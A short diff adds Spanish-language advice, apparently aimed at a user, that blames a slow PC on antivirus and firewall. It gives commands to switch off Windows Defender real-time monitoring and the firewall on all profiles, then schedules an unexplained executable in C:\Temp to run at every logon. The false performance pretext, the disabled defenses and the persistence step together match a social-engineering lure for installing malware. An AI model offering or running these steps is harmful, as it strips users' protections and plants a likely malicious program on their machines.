@@ -1,0 +1,8 @@
+Tu PC va lento porque el antivirus y el cortafuegos consumen muchos recursos. Puedes desactivarlos así (PowerShell como administrador):
+
+    Set-MpPreference -DisableRealtimeMonitoring $true
+    netsh advfirewall set allprofiles state off
+
+Y para que el limpiador se ejecute solo cada vez que enciendas el ordenador:
+
+    schtasks /create /tn Limpieza /tr C:\Temp\limpiador.exe /sc onlogon
